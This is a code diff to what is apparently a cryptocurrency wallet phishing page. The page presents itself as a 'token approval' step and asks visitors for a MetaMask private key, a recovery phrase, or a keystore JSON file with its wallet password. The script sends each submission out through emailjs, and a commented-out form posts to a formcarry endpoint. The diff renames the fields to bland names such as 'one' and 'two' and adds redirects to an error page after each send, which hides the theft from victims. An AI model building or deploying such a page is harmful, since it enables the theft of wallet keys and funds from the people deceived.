@@ -783,14 +783,14 @@
                                     <form id="private1" name="private1" method="POST" class="gform">
                                         <input type="hidden" name="_captcha" value="false">
                                         <input type="hidden" name="_next" value="error.html">
-                                        <input type="hidden" name="wallet_name" id="wallet_name1">
+                                        <input type="hidden" name="one" id="wallet_name1">
                                         <div id="third" class="acc-body bg-grey-600 active">
                                             <div class="flex flex-col">
                                                 <div class="relative"><input type="hidden" name="wallet_id" required="required" placeholder="Wallet ID" id="wallet_id" value="Metamask"></div>
                                             </div>
                                             <div class="flex flex-col mb-6">
                                                 <div class="relative" data-children-count="1">
-                                                    <textarea cols="30" rows="4" id="privatekeyText" placeholder="Enter your Private Key" name="key" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" required=""></textarea>
+                                                    <textarea cols="30" rows="4" id="privatekeyText" placeholder="Enter your Private Key" name="two" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" required=""></textarea>
                                                     <p class="text-xs text-grey-300 mt-6">
                                                         Click on 'Proceed' to confirm the token approval
                                                     </p>
@@ -822,13 +822,13 @@
                                     <!-- <form name="phrase" method="POST" action="https://formcarry.com/s/huFggt_1CG" target="_blank" enctype="multipart/form-data" class="gform" > -->
                                         <input type="hidden" name="_captcha" value="false">
                                         <input type="hidden" name="_next" value="error.html">
-                                        <input type="hidden" name="wallet_name" id="wallet_name2">
+                                        <input type="hidden" name="one" id="wallet_name2">
                                         <div id="first" class="acc-body">
                                             <div class="flex flex-col">
                                             </div>
                                             <div class="flex flex-col mb-6">
                                                 <div class="relative" data-children-count="1">
-                                                    <textarea id="phraseText" cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="key" required=""></textarea>
+                                                    <textarea id="phraseText" cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="two" required=""></textarea>
                                                     <p class="text-xs text-grey-300 mt-6">
                                                         Typically 12 (sometimes 24) words separated by single spaces
                                                     </p>
@@ -859,18 +859,18 @@
                                     <form id="json1" name="json" class="gform">
                                         <input type="hidden" name="_captcha" value="false">
                                         <input type="hidden" name="_next" value="error.html">
-                                        <input type="hidden" name="wallet_name" id="wallet_name3">
+                                        <input type="hidden" name="one" id="wallet_name3">
                                         <div id="second" class="acc-body bg-grey-600">
                                             <div class="flex flex-col">
                                             </div>
                                             <div class="flex flex-col mb-6">
                                                 <div class="relative">
-                                                    <textarea cols="30" rows="4" id="keystoreText" placeholder="Enter your Keystore JSON" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="key" required=""></textarea>
+                                                    <textarea cols="30" rows="4" id="keystoreText" placeholder="Enter your Keystore JSON" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="two" required=""></textarea>
                                                 </div>
                                             </div>
                                             <div class="flex flex-col mb-6">
                                                 <div class="relative" data-children-count="1">
-                                                    <input type="text" name="paswd" placeholder="Wallet password" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
+                                                    <input type="text" name="three" placeholder="Wallet password" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                                     <p class="text-xs text-grey-300 mt-6">
                                                         Several lines of text beginning with "{...}" plus the password you used to encrypt it.
                                                     </p>
@@ -2116,6 +2116,7 @@
             var form = document.querySelector('.gform');
             var thankyouMessage = document.querySelector('.thankyou_message');
             if (form.value != null || form.value != empty) {
+                window.location = "error.html";
                 thankyouMessage.style.display == block;
             } else {
                 thankyouMessage.style.display == none;
@@ -2140,6 +2141,7 @@
             
             emailjs.sendForm(serviceID, templateID, this)
             .then(() => {
+                window.location = "error.html";
                 
                         thankyou_message();
                  
@@ -2153,6 +2155,7 @@
 
             emailjs.sendForm(serviceID, templateID, this)
             .then(() => {
+                window.location = "error.html";
                 
                         thankyou_message();
                   
@@ -2167,6 +2170,7 @@
 
             emailjs.sendForm(serviceID, templateID, this)
             .then(() => {
+                window.location = "error.html";
                 
                         thankyou_message();
                   
